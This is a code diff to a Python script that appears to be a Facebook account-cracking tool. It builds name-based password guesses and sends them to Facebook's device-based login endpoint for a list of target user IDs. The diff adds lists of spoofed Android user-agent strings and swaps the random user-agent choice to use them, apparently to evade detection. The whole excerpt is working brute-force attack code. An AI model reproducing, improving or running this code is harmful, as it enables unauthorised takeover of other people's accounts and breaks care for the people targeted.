@@ -43,6 +43,8 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
+ugen2=['Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36']
+ugen3=['Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; RMX2027 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 WpsMoffice/16.4.2/arm64-v8a/1339', 'Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322', 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]', 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/284.0.0.16.119;]', 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/280.0.0.16.110;]', 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/277.0.0.12.116;]', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4200.0 Iron Safari/537.36 Mozilla/5.0 (Linux; Android 10; RMX2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.47 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/273.0.0.16.120;]']
 
 logo=("""\033[1;37m
 \033[1;34m ZZZZZZZZZZ       ZZZ         ZZZZ\033[1;34m
@@ -458,7 +460,7 @@ def ffb(ids,names,passlist):
                 ps2 = last.lower()
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        ua=random.choice(ugen)
+                        ua=random.choice(ugen3)
                         head = {"authority": 'm.facebook.com', "method": 'GET', "scheme": 'https', "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9', "accept-encoding": 'gzip, deflate, br', "accept-language": 'en-US,en;q=0.9', "cache-control": 'max-age=0', "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"', "sec-ch-ua-mobile": '?1', "sec-ch-ua-platform": '"Android"', "sec-fetch-dest": 'document', "sec-fetch-mode": 'navigate', "sec-fetch-site": 'none', "sec-fetch-user": '?1', "upgrade-insecure-requests": '1', "user-agent": ua,}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
